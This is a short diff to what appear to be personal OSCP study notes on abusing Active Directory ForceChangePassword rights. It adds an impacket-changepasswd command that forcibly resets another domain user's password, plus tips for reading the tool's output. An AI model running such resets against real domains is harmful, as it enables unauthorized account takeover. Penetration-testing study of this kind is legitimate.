@@ -1,4 +1,10 @@
 ## First Degree Object Control / ForceChangePassword 
+
+```
+impacket-changepasswd -reset -protocol smb-samr 'corp.local/bob@10.10.10.10' -newpass 'NewPassword123!' -altuser 'corp.local/alice' -altpass 'Password123!'
+```
+
+---
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
@@ -14,3 +20,6 @@ dv.paragraph("```bash\n" + command + "\n```");
 Means your password has to be more complex
 
 No response = good
+
+---
+
